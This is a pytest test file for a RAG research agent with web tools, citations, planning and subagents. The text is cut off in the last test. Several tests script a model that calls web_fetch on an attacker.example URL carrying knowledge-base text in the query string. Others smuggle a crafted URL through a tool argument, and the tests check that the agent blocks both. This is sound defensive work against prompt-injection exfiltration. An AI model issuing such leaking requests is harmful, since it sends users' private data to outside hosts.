import asyncio
import contextlib
import threading
import time
from datetime import datetime, timedelta, timezone
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.core.config import settings
from app.core.llm_client import LlmEndpoint
from app import prompts
from app.core.limits import MAX_KB_CATALOG_CHARS
from app.models import Document as DbDocument
from app.models import database as database_module
from app.rag import agent as agent_module
from app.rag.agent import ResearchAgent
from app.rag.agent_mode import clear_old_tool_results, turn_note
from app.rag import tool_approval
from app.rag.tool_approval import approval_broker
from app.rag.retrievers.hybrid import RetrievedChunk
from app.rag.tools import ResearchToolRegistry, is_web_fetch_domain_allowed
from app.rag.types import Document
class StaticRetriever:
    def smart_search(self, query, target_document=None):
        doc = Document(page_content="特休依年資計算", metadata={"source": "leave.txt", "chunk_index": 0, "chunk_id": 7})
        return [RetrievedChunk(document=doc, score=0.9, relevance=0.9, pinned=False)]
class EmptyRetriever:
    def smart_search(self, query, target_document=None):
        return []
async def collect(events):
    return [event async for event in events]
TEST_ENDPOINT = LlmEndpoint("ollama", "http://127.0.0.1:9", None, None, False)
TEST_MODEL = "test-model"
def research(agent, query, **kwargs):
    return agent.stream_research(query, endpoint=TEST_ENDPOINT, model_name=TEST_MODEL, **{"allow_web": True, **kwargs})
def tool_call(name, arguments, call_id="call_1"):
    return {"role": "assistant", "content": "", "tool_calls": [{"id": call_id, "function": {"name": name, "arguments": arguments}}]}
def answer(text):
    return {"role": "assistant", "content": text}
class ScriptedLLM:
    def __init__(self, responses, stream_text="串流答案"):
        self.responses = list(responses)
        self.stream_text = stream_text
        self.chat_messages = []
        self.chat_tools = []
        self.stream_calls = 0
        self.stream_messages = []
    async def chat(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
        assert (endpoint, model_name) == (TEST_ENDPOINT, TEST_MODEL)
        self.chat_messages.append(list(messages))
        self.chat_tools.append(tools)
        response = self.responses.pop(0)
        if isinstance(response, Exception):
            raise response
        return response
    async def stream(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
        self.stream_calls += 1
        self.stream_messages.append(list(messages))
        yield self.stream_text
    def install(self, monkeypatch):
        monkeypatch.setattr(agent_module, "chat_completion", self.chat)
        monkeypatch.setattr(agent_module, "stream_completion", self.stream)
        return self
def make_agent(monkeypatch, retriever=None):
    registry = ResearchToolRegistry(retriever=retriever or StaticRetriever())
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None, conversation_id=None, requested_skill=None: [])
    return ResearchAgent(tool_registry=registry), registry
def record_web_calls(monkeypatch, registry):
    calls = []
    async def fake_web_search(query, max_results=5):
        calls.append(("web_search", query))
        return {"query": query, "results": []}
    async def fake_web_fetch(url):
        calls.append(("web_fetch", url))
        return {"url": url, "title": "新聞", "content": "內文"}
    monkeypatch.setattr(registry, "web_search", fake_web_search)
    monkeypatch.setattr(registry, "web_fetch", fake_web_fetch)
    return calls
def step_statuses(events):
    return [(e["data"]["tool"], e["data"]["status"]) for e in events if e["event"] == "step_end"]
@pytest.mark.asyncio
async def test_answer_after_tools_is_sent_directly_without_regeneration(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算 [1]")]).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    assert (len(llm.chat_messages), llm.stream_calls) == (2, 0)
    assert [e["data"]["content"] for e in events if e["event"] == "token"] == ["特休依年資計算 [1]"]
    done = events[-1]["data"]
    assert done["answer"] == "特休依年資計算 [1]"
    assert done["sources"] == ["leave.txt"]
    assert done["sources_detail"] == [
        {"citation": 1, "source": "leave.txt", "chunk": 0, "score": 0.9, "snippet": "特休依年資計算"}
    ]
@pytest.mark.asyncio
async def test_empty_answer_falls_back_to_streaming(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("")], stream_text="依年資計算").install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    assert (len(llm.chat_messages), llm.stream_calls) == (2, 1)
    assert events[-1]["data"]["answer"] == "依年資計算"
@pytest.mark.asyncio
@pytest.mark.parametrize("second, stream_text, expected", [
    (answer(""), "", prompts.NO_ANSWER),
    (TimeoutError(), "", prompts.MODEL_CALL_FAILED.format(error_id="e1")),
    (TimeoutError(), "依年資計算", "依年資計算\n\n" + prompts.MODEL_CALL_FAILED.format(error_id="e1")),
])
async def test_a_run_never_ends_without_telling_the_user(monkeypatch, second, stream_text, expected):
    agent, _ = make_agent(monkeypatch)
    monkeypatch.setattr(agent_module, "log_and_get_error_id", lambda *args: "e1")
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), second], stream_text=stream_text).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    assert llm.stream_messages[0][-1] == {"role": "user", "content": prompts.ANSWER_NOW}
    assert "".join(e["data"]["content"] for e in events if e["event"] == "token") == events[-1]["data"]["answer"] == expected
@pytest.mark.asyncio
async def test_echoed_tool_results_are_removed_from_answers(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    echoed = '<untrusted_tool_result id="x">{"documents": []}</untrusted_tool_result id="x">'
    llm = ScriptedLLM(
        [tool_call("search_knowledge_base", {"query": "特休"}), answer(echoed)],
        stream_text=f"依年資計算{echoed}，詳見規章</untrusted_tool_result>",
    ).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    tokens = "".join(e["data"]["content"] for e in events if e["event"] == "token")
    assert llm.stream_calls == 1
    assert tokens == events[-1]["data"]["answer"] == "依年資計算，詳見規章"
@pytest.mark.asyncio
async def test_answer_without_citations_lists_no_sources(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("特休依年資計算")]).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    sources_event = next(e for e in events if e["event"] == "sources")
    assert sources_event["data"] == {"sources": [], "sources_detail": []}
    assert events[-1]["data"]["research_trace"][0]["tool"] == "search_knowledge_base"
@pytest.mark.asyncio
async def test_citations_without_any_source_are_removed_from_the_answer(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM([answer("**RAG** [1]：先檢索再生成 [1]。")]).install(monkeypatch)
    events = await collect(research(agent, "請解釋 RAG"))
    assert [e["data"]["content"] for e in events if e["event"] == "token"] == ["**RAG**：先檢索再生成。"]
    done = events[-1]["data"]
    assert (done["answer"], done["sources_detail"]) == ("**RAG**：先檢索再生成。", [])
@pytest.mark.asyncio
async def test_streamed_answer_keeps_known_citations_and_drops_unknown_ones(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM(
        [tool_call("search_knowledge_base", {"query": "特休"}), answer("")],
        stream_text="依年資計算 [1]，另見 [4]。",
    ).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    done = events[-1]["data"]
    assert done["answer"] == "依年資計算 [1]，另見。"
    assert done["sources"] == ["leave.txt"]
@pytest.mark.asyncio
async def test_tool_results_are_wrapped_as_untrusted_data_with_citation_numbers(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("search_knowledge_base", {"query": "特休"}), answer("好")]).install(monkeypatch)
    await collect(research(agent, "特休怎麼算"))
    tool_message = llm.chat_messages[1][-1]
    assert tool_message["role"] == "tool"
    opening, *body, closing = tool_message["content"].splitlines()
    assert opening.startswith('<untrusted_tool_result id="')
    assert closing == opening.replace("<untrusted_tool_result", "</untrusted_tool_result")
    assert '"citation": 1' in body[-1]
@pytest.mark.asyncio
async def test_latest_user_message_carries_the_current_local_time(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("好")]).install(monkeypatch)
    monkeypatch.setattr(agent_module, "local_now", lambda: datetime(2026, 11, 8, 23, 7, tzinfo=timezone(timedelta(hours=8))))
    history = [{"role": "user", "content": "先前的問題"}, {"role": "assistant", "content": "好"}]
    await collect(research(agent, "把檔案的時間改成現在", conversation_history=history))
    messages = llm.chat_messages[0]
    assert messages[-1]["content"] == "[現在時間：2026-11-08（星期日）23:07，時區 UTC+08:00]\n\n把檔案的時間改成現在"
    assert messages[1]["content"] == "先前的問題"
    assert "2026-11-08" not in messages[0]["content"]
def test_current_time_formats_negative_offsets():
    assert agent_module.with_current_time("問", datetime(2026, 1, 5, 9, 5, tzinfo=timezone(timedelta(hours=-5, minutes=-30)))).startswith("[現在時間：2026-01-05（星期一）09:05，時區 UTC-05:30]")
@pytest.mark.asyncio
async def test_previous_answer_citation_markers_are_not_sent_back(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("好")]).install(monkeypatch)
    history = [{"role": "user", "content": "特休怎麼算"}, {"role": "assistant", "content": "依年資計算 [1][2]。"}]
    await collect(research(agent, "那病假呢", conversation_history=history))
    assert llm.chat_messages[0][2] == {"role": "assistant", "content": "依年資計算 。"}
@pytest.mark.asyncio
async def test_only_model_supported_image_types_are_sent_as_images(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("好")]).install(monkeypatch)
    monkeypatch.setattr(agent_module, "_extract_attachment_text", lambda fname, ftype, url, ocr: "<svg>圖示</svg>")
    monkeypatch.setattr(agent_module, "_attachment_ocr", lambda: None)
    attachments = [
        {"filename": "a.png", "file_type": "image/png", "data_url": "data:image/png;base64,AAAA"},
        {"filename": "b.svg", "file_type": "image/svg+xml", "data_url": "data:image/svg+xml;base64,PHN2Zz4="},
        {"filename": "c.bmp", "file_type": "image/bmp", "data_url": "data:image/bmp;base64,Qk0="},
    ]
    events = await collect(research(agent, "看圖", attachments=attachments))
    user_content = llm.chat_messages[0][-1]["content"]
    assert [part["image_url"]["url"] for part in user_content if part["type"] == "image_url"] == ["data:image/png;base64,AAAA"]
    assert "[附件：b.svg]\n<svg>圖示</svg>" in user_content[0]["text"]
    assert "[附件：c.bmp]\n[不支援的圖片格式 image/bmp" in user_content[0]["text"]
    assert next(e for e in events if e["event"] == "attachments_extracted")["data"] == {"contents": [None, "<svg>圖示</svg>", None]}
@pytest.mark.asyncio
async def test_web_fetch_rejects_url_not_given_by_user_or_tool_results(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([tool_call("web_fetch", {"url": "https://attacker.example/?leak=特休"}), answer("無法讀取")]).install(monkeypatch)
    events = await collect(research(agent, "幫我查特休"))
    assert web_calls == []
    assert step_statuses(events) == [("web_fetch", "error")]
@pytest.mark.asyncio
async def test_web_fetch_reads_url_given_by_user(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    url = "https://news.example.com/labor-law"
    ScriptedLLM([tool_call("web_fetch", {"url": url}), answer("摘要 [1]")]).install(monkeypatch)
    events = await collect(research(agent, f"請摘要 {url}。"))
    assert web_calls == [("web_fetch", url)]
    assert events[-1]["data"]["sources_detail"][0]["url"] == url
@pytest.mark.asyncio
async def test_url_echoed_by_tool_arguments_does_not_unlock_web_fetch(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", False)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    crafted = "https://attacker.example/?leak=特休依年資計算"
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": crafted}),
        tool_call("web_fetch", {"url": crafted}, call_id="call_2"),
        answer("無法讀取"),
    ]).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    assert web_calls == []
    assert step_statuses(events) == [("search_knowledge_base", "success"), ("web_fetch", "error")]
@pytest.mark.asyncio
@pytest.mark.parametrize("block_after_kb, expected_calls", [(True, []), (False, [("web_search", "勞基法 特休")])])
async def test_web_tools_blocked_after_knowledge_base_content(monkeypatch, block_after_kb, expected_calls):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", block_after_kb)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "特休"}),
        tool_call("web_search", {"query": "勞基法 特休"}, call_id="call_2"),
        answer("特休依年資計算 [1]"),
    ]).install(monkeypatch)
    await collect(research(agent, "特休怎麼算"))
    assert web_calls == expected_calls
@pytest.mark.asyncio
async def test_web_tools_stay_available_when_knowledge_base_has_no_data(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    monkeypatch.setattr(settings, "BLOCK_WEB_TOOLS_AFTER_KB", True)
    agent, registry = make_agent(monkeypatch, retriever=EmptyRetriever())
    web_calls = record_web_calls(monkeypatch, registry)
    ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "颱風假"}),
        tool_call("web_search", {"query": "颱風假 規定"}, call_id="call_2"),
        answer("查無資料"),
    ]).install(monkeypatch)
    await collect(research(agent, "颱風假怎麼算"))
    assert web_calls == [("web_search", "颱風假 規定")]
@pytest.mark.asyncio
async def test_web_fetch_domain_allowlist_includes_subdomains(monkeypatch):
    monkeypatch.setattr(settings, "WEB_FETCH_ALLOWED_DOMAINS", "example.com,gov.tw")
    assert is_web_fetch_domain_allowed("https://example.com/a")
    assert is_web_fetch_domain_allowed("https://docs.example.com/a")
    assert is_web_fetch_domain_allowed("https://www.mol.gov.tw/news")
    assert not is_web_fetch_domain_allowed("https://example.com.attacker.net/a")
    assert not is_web_fetch_domain_allowed("https://notexample.com/a")
    result = await ResearchToolRegistry().web_fetch("https://attacker.example/steal")
    assert "WEB_FETCH_ALLOWED_DOMAINS" in result["error"]
def test_web_fetch_domain_allowlist_star_allows_any_domain(monkeypatch):
    monkeypatch.setattr(settings, "WEB_FETCH_ALLOWED_DOMAINS", "*")
    assert is_web_fetch_domain_allowed("https://any.example.org/page")
@pytest.mark.asyncio
async def test_web_tools_hidden_and_blocked_when_disabled(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", False)
    registry = ResearchToolRegistry(retriever=StaticRetriever())
    async def must_not_fetch(url):
        raise AssertionError("web_fetch must not run when ENABLE_WEB_SEARCH is false")
    monkeypatch.setattr(registry, "web_fetch", must_not_fetch)
    names = [tool["function"]["name"] for tool in registry.get_tool_definitions()]
    result = await registry.execute_tool("web_fetch", {"url": "https://example.com"})
    assert "search_knowledge_base" in names
    assert "web_search" not in names
    assert "web_fetch" not in names
    assert "error" in result
@pytest.mark.asyncio
async def test_search_knowledge_base_does_not_block_event_loop():
    class SlowRetriever:
        def smart_search(self, query, target_document=None):
            time.sleep(0.5)
            return []
    registry = ResearchToolRegistry(retriever=SlowRetriever())
    ticks = 0
    async def ticker():
        nonlocal ticks
        while True:
            await asyncio.sleep(0.01)
            ticks += 1
    ticker_task = asyncio.create_task(ticker())
    await registry.search_knowledge_base("特休")
    ticker_task.cancel()
    with contextlib.suppress(asyncio.CancelledError):
        await ticker_task
    assert ticks >= 10
@pytest.mark.asyncio
@pytest.mark.parametrize("arguments", [
    {"query": "特休", "top_k": None},
    {"query": "特休", "top_k": "3 筆"},
    '["特休"]',
])
async def test_malformed_tool_arguments_do_not_abort_the_answer(monkeypatch, arguments):
    agent, _ = make_agent(monkeypatch)
    ScriptedLLM([tool_call("search_knowledge_base", arguments), answer("依年資計算")]).install(monkeypatch)
    events = await collect(research(agent, "特休怎麼算"))
    assert events[-1]["event"] == "done"
    assert events[-1]["data"]["answer"] == "依年資計算"
@pytest.mark.asyncio
async def test_tool_definitions_are_loaded_off_the_event_loop(monkeypatch):
    agent, registry = make_agent(monkeypatch)
    loaded_in = []
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None, conversation_id=None, requested_skill=None: loaded_in.append(threading.get_ident()) or [])
    ScriptedLLM([answer("你好")]).install(monkeypatch)
    await collect(research(agent, "你好"))
    assert loaded_in and loaded_in[0] != threading.get_ident()
def test_knowledge_base_catalog_stays_within_its_limit(tmp_path, monkeypatch):
    engine = create_engine(f"sqlite:///{tmp_path / 'kb.db'}")
    database_module.Base.metadata.create_all(engine)
    Session = sessionmaker(bind=engine)
    with Session() as session:
        session.add_all(
            DbDocument(filename=f"doc-{index}.txt", content="內容", file_type="text/plain", description="摘要" * 60)
            for index in range(300)
        )
        session.commit()
    monkeypatch.setattr(database_module, "SessionLocal", Session)
    description, filenames = ResearchToolRegistry()._build_knowledge_base_description()
    assert len(description) < MAX_KB_CATALOG_CHARS + 300
    assert "《doc-0.txt》" in description
    assert "份文件未列出" in description
    assert filenames == []
    engine.dispose()
def test_target_document_lists_actual_filenames(monkeypatch):
    registry = ResearchToolRegistry(retriever=StaticRetriever())
    monkeypatch.setattr(registry, "_generate_knowledge_base_description", lambda: ("desc", ["posts.js", "rules.md"]))
    tools_def = registry.get_tool_definitions()
    for name in ("search_knowledge_base", "filter_and_count_records"):
        schema = next(t for t in tools_def if t["function"]["name"] == name)["function"]["parameters"]["properties"]["target_document"]
        assert schema["enum"] == ["posts.js", "rules.md"]
        assert "posts-export.json" not in schema["description"]
PLAN = [{"step": "查特休規定", "status": "in_progress"}, {"step": "整理成表格", "status": "pending"}]
@pytest.mark.asyncio
async def test_agent_mode_plans_without_adding_trace_steps(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([
        tool_call("update_plan", {"items": PLAN}),
        tool_call("search_knowledge_base", {"query": "特休"}, "call_2"),
        answer("已整理完成 [1]"),
    ]).install(monkeypatch)
    events = await collect(research(agent, "整理特休規定", mode="agent"))
    assert llm.chat_messages[0][0]["content"] == prompts.AGENT_SYSTEM_PROMPT
    assert [tool["function"]["name"] for tool in llm.chat_tools[0]] == ["update_plan", "ask_user", "delegate_research"]
    assert [e["data"] for e in events if e["event"] == "plan"] == [{"items": PLAN}]
    assert [(e["data"]["step"], e["data"]["tool"]) for e in events if e["event"] == "step_end"] == [(1, "search_knowledge_base")]
    plan_reply = next(m for m in llm.chat_messages[1] if m.get("role") == "tool")
    assert prompts.PLAN_UPDATED in plan_reply["content"]
    assert events[-1]["data"]["plan"] == PLAN
@pytest.mark.asyncio
async def test_research_mode_keeps_its_prompt_and_has_no_plan_tool(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("你好")]).install(monkeypatch)
    events = await collect(research(agent, "你好"))
    assert llm.chat_messages[0][0]["content"] == prompts.SYSTEM_PROMPT
    assert llm.chat_tools[0] == []
    assert events[-1]["data"]["plan"] is None
@pytest.mark.asyncio
async def test_invalid_plan_goes_back_to_the_model(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([
        tool_call("update_plan", {"items": [{"step": "查資料", "status": "done"}]}),
        answer("完成"),
    ]).install(monkeypatch)
    events = await collect(research(agent, "整理資料", mode="agent"))
    assert not [e for e in events if e["event"] == "plan"]
    plan_reply = next(m for m in llm.chat_messages[1] if m.get("role") == "tool")
    assert plan_reply["_is_error"] and "計畫格式不正確" in plan_reply["content"]
@pytest.mark.asyncio
async def test_agent_mode_stops_at_the_turn_limit_and_reports_progress(monkeypatch):
    monkeypatch.setattr(agent_module, "MAX_AGENT_TURNS", 2)
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "特休"}),
        tool_call("search_knowledge_base", {"query": "加班"}, "call_2"),
    ]).install(monkeypatch)
    events = await collect(research(agent, "整理所有人事規定", mode="agent"))
    assert (len(llm.chat_messages), llm.stream_calls) == (2, 1)
    assert llm.stream_messages[0][-1] == {"role": "user", "content": prompts.AGENT_TURN_LIMIT.format(limit=2)}
    assert events[-1]["data"]["answer"] == "串流答案"
def test_old_tool_results_are_cleared_oldest_first_within_the_budget():
    messages = [{"role": "system", "content": "s"}] + [
        {"role": "tool", "tool_call_id": f"c{i}", "content": text}
        for i, text in enumerate(["短", "甲" * 1000, "乙" * 1000, "丙" * 1000])
    ]
    clear_old_tool_results(messages, 1500)
    assert [m["content"] for m in messages[1:]] == ["短", prompts.TOOL_RESULT_CLEARED, prompts.TOOL_RESULT_CLEARED, "丙" * 1000]
@pytest.mark.asyncio
@pytest.mark.parametrize("mode, first_result_cleared", [("agent", True), ("research", False)])
async def test_only_agent_mode_clears_old_tool_results_before_calling_the_model(monkeypatch, mode, first_result_cleared):
    monkeypatch.setattr(agent_module, "AGENT_TOOL_RESULT_BUDGET_CHARS", 10)
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([
        tool_call("search_knowledge_base", {"query": "特休"}),
        tool_call("search_knowledge_base", {"query": "加班"}, "call_2"),
        answer("完成"),
    ]).install(monkeypatch)
    await collect(research(agent, "整理人事規定", mode=mode))
    first, latest = [m["content"] for m in llm.chat_messages[2] if m.get("role") == "tool"]
    assert (first == prompts.TOOL_RESULT_CLEARED) is first_result_cleared
    assert latest != prompts.TOOL_RESULT_CLEARED
def ask(question, options, note=""):
    return {"role": "assistant", "content": note, "tool_calls": [{"id": "ask_1", "function": {"name": "ask_user", "arguments": {"question": question, "options": options}}}]}
@pytest.mark.asyncio
async def test_agent_asks_the_user_and_continues_with_the_answer(monkeypatch):
    monkeypatch.setattr(settings, "ENABLE_WEB_SEARCH", True)
    agent, registry = make_agent(monkeypatch)
    web_calls = record_web_calls(monkeypatch, registry)
    url = "https://intranet.example.com/attendance"
    llm = ScriptedLLM([
        ask("要整理哪個月份？", ["八月", "九月", "八月"], "先確認要整理的月份 [3]"),
        tool_call("web_fetch", {"url": url}, "call_2"),
        answer("已整理九月"),
    ]).install(monkeypatch)
    events = []
    async for event in research(agent, "整理出勤", mode="agent", approval_user_id=7):
        events.append(event)
        if event["event"] == "question":
            assert approval_broker.answer(event["data"]["question_id"], 8, "九月") is False
            assert approval_broker.answer(event["data"]["question_id"], 7, f"九月，資料在 {url}") is True
    question = next(e["data"] for e in events if e["event"] == "question")
    assert (question["question"], question["options"], question["step"]) == ("要整理哪個月份？", ["八月", "九月"], 1)
    assert [e["data"]["answered"] for e in events if e["event"] == "question_resolved"] == [True]
    reply = next(m for m in llm.chat_messages[1] if m.get("role") == "tool")
    assert reply["content"] == prompts.ASK_USER_ANSWER.format(answer=f"九月，資料在 {url}")
    started = next(e["data"] for e in events if e["event"] == "step_start")
    assert (started["tool"], started["note"]) == ("ask_user", "先確認要整理的月份")
    assert web_calls == [("web_fetch", url)]
@pytest.mark.asyncio
async def test_unanswered_question_lets_the_agent_carry_on(monkeypatch):
    monkeypatch.setattr(tool_approval, "APPROVAL_TIMEOUT_SECONDS", 0.01)
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([ask("要整理哪個月份？", []), answer("先整理本月")]).install(monkeypatch)
    events = await collect(research(agent, "整理出勤", mode="agent", approval_user_id=7))
    assert [e["data"]["answered"] for e in events if e["event"] == "question_resolved"] == [False]
    reply = next(m for m in llm.chat_messages[1] if m.get("role") == "tool")
    assert reply["_is_error"] and prompts.ASK_USER_NO_ANSWER in reply["content"]
@pytest.mark.asyncio
@pytest.mark.parametrize("arguments", [{"question": " "}, {"question": "哪個月？", "options": ["一"] * 5}])
async def test_malformed_question_goes_back_to_the_model(monkeypatch, arguments):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([tool_call("ask_user", arguments), answer("完成")]).install(monkeypatch)
    events = await collect(research(agent, "整理出勤", mode="agent", approval_user_id=7))
    assert not [e for e in events if e["event"] == "question"]
    reply = next(m for m in llm.chat_messages[1] if m.get("role") == "tool")
    assert "問題格式不正確" in reply["content"]
@pytest.mark.parametrize("content, note", [
    ("<think>\n使用者要整理規定\n</think>\n\n先查差旅規定 [1]", "先查差旅規定"),
    ("<think>還在想要查哪份文件", None),
    ("先查差旅規定<think>再想想", "先查差旅規定"),
    ("", None),
    ("查" * 400, "查" * 299 + "…"),
])
def test_progress_notes_hide_thinking_and_stay_short(content, note):
    assert turn_note(content) == note
def tool_def(name):
    return {"type": "function", "function": {"name": name, "description": name, "parameters": {"type": "object", "properties": {}}}}
@pytest.mark.asyncio
@pytest.mark.parametrize("allow_web", [True, False])
async def test_the_web_switch_decides_whether_web_tools_are_offered(monkeypatch, allow_web):
    agent, registry = make_agent(monkeypatch)
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None, conversation_id=None, requested_skill=None: [tool_def(name) for name in ("search_knowledge_base", "web_search", "web_fetch")])
    calls = record_web_calls(monkeypatch, registry)
    llm = ScriptedLLM([tool_call("web_search", {"query": "elephant-goldfish-model"}), answer("好")]).install(monkeypatch)
    events = await collect(research(agent, "elephant-goldfish-model 是什麼", allow_web=allow_web))
    offered = [tool["function"]["name"] for tool in llm.chat_tools[0]]
    assert offered == (["search_knowledge_base", "web_search", "web_fetch"] if allow_web else ["search_knowledge_base"])
    assert llm.chat_messages[0][0]["content"].endswith(prompts.WEB_ALLOWED if allow_web else prompts.WEB_TURNED_OFF)
    assert calls == ([("web_search", "elephant-goldfish-model")] if allow_web else [])
    assert step_statuses(events) == [("web_search", "success" if allow_web else "error")]
@pytest.mark.asyncio
async def test_no_web_rules_when_the_server_has_no_web_tools(monkeypatch):
    agent, _ = make_agent(monkeypatch)
    llm = ScriptedLLM([answer("好")]).install(monkeypatch)
    await collect(research(agent, "你好", allow_web=True))
    assert llm.chat_messages[0][0]["content"] == prompts.SYSTEM_PROMPT
class RoutedLLM:
    def __init__(self, main, subagents, failing=()):
        self.main = list(main)
        self.subagents = {title: list(replies) for title, replies in subagents.items()}
        self.failing = set(failing)
        self.main_messages = []
        self.subagent_tools = {}
        self.stream_calls = 0
    async def chat(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
        if messages[0]["content"] == prompts.SUBAGENT_SYSTEM_PROMPT:
            title = messages[1]["content"].split("[子任務：", 1)[1].split("]", 1)[0]
            self.subagent_tools[title] = [tool["function"]["name"] for tool in tools]
            await asyncio.sleep(0)
            if title in self.failing:
                raise RuntimeError("模型連線中斷")
            return self.subagents[title].pop(0)
        self.main_messages.append(list(messages))
        return self.main.pop(0)
    async def stream(self, messages, *, endpoint, model_name, tools=None, reasoning_effort=None):
        self.stream_calls += 1
        yield "子代理收尾摘要 [1]"
    def install(self, monkeypatch):
        monkeypatch.setattr(agent_module, "chat_completion", self.chat)
        monkeypatch.setattr(agent_module, "stream_completion", self.stream)
        return self
def delegate(*titles):
    return tool_call("delegate_research", {"tasks": [{"title": title, "instructions": f"查{title}的規定"} for title in titles]})
def subagent_agent(monkeypatch):
    agent, registry = make_agent(monkeypatch)
    monkeypatch.setattr(registry, "get_tool_definitions", lambda user_id=None, conversation_id=None, requested_skill=None: [tool_def("search_knowledge_base"), tool_def("create_conversation_file")])
    return agent
@pytest.mark.asyncio
async def test_subagents_research_in_parallel_and_share_citations(monkeypatch):
    agent = subagent_agent(monkeypatch)
    llm = RoutedLLM(
        [delegate("國內出差", "國外出差"), answer("兩種出差都依年資計算 [1]")],
        {
            "國內出差": [{"role": "assistant", "content": "先查國內規定", "tool_calls": [{"id": "s1", "function": {"name": "search_knowledge_base", "arguments": {"query": "國內出差"}}}]}, answer("國內：依年資計算 [1]")],
            "國外出差": [tool_call("search_knowledge_base", {"query": "國外出差"}, "s2"), answer("國外：依年資計算 [1]")],
        },
    ).install(monkeypatch)
    events = await collect(research(agent, "比較國內外出差規定", mode="agent", approval_user_id=7))
    assert llm.subagent_tools == {"國內出差": ["search_knowledge_base"], "國外出差": ["search_knowledge_base"]}
    ended = {e["data"]["step"]: e["data"] for e in events if e["event"] == "step_end"}
    assert sorted(ended) == [1, 2, 3]
    assert ended[1]["tool"] == "delegate_research" and "agent" not in ended[1]
    assert sorted(ended[step]["agent"] for step in (2, 3)) == ["子任務 1：國內出差", "子任務 2：國外出差"]
    assert next(ended[step]["note"] for step in (2, 3) if ended[step]["agent"].endswith("國內出差")) == "先查國內規定"
    starts = [e["data"]["step"] for e in events if e["event"] == "step_start"]
    assert starts[0] == 1 and starts.index(1) < starts.index(2)
    delegated = next(m for m in llm.main_messages[1] if m.get("role") == "tool")["content"]
    assert "國內：依年資計算 [1]" in delegated and "國外：依年資計算 [1]" in delegated
    done = events[-1]["data"]
    assert done["answer"] == "兩種出差都依年資計算 [1]"
    assert [source["citation"] for source in done["sources_detail"]] == [1]
    assert len(done["research_trace"]) == 3
@pytest.mark.asyncio
async def test_subagents_cannot_write_and_report_their_failures(monkeypatch):
    agent = subagent_agent(monkeypatch)
    executed = []
    original = agent.tools.execute_tool
    async def tracking_execute(name, arguments, **kwargs):
        executed.append(name)
        return await original(name, arguments, **kwargs)
    monkeypatch.setattr(agent.tools, "execute_tool", tracking_execute)
    llm = RoutedLLM(
        [delegate("寫檔", "斷線"), answer("完成")],
        {"寫檔": [tool_call("create_conversation_file", {"filename": "a.md", "content": "x"}), answer("沒辦法寫檔")]},
        failing={"斷線"},
    ).install(monkeypatch)
    events = await collect(research(agent, "整理資料", mode="agent", approval_user_id=7))
    refused = next(e["data"] for e in events if e["event"] == "step_end" and e["data"].get("agent") == "子任務 1：寫檔")
    assert refused["status"] == "error" and prompts.SUBAGENT_TOOL_UNAVAILABLE in refused["output_preview"]
    assert executed == []
    delegated = next(m for m in llm.main_messages[1] if m.get("role") == "tool")["content"]
    assert "沒辦法寫檔" in delegated and "子任務執行失敗（錯誤代碼：" in delegated
@pytest.mark.asyncio
async def test_subagent_reports_when_it_runs_out_of_turns(monkeypatch):
    monkeypatch.setattr(agent_module, "MAX_SUBAGENT_TURNS", 1)
    agent = subagent_agent(monkeypatch)
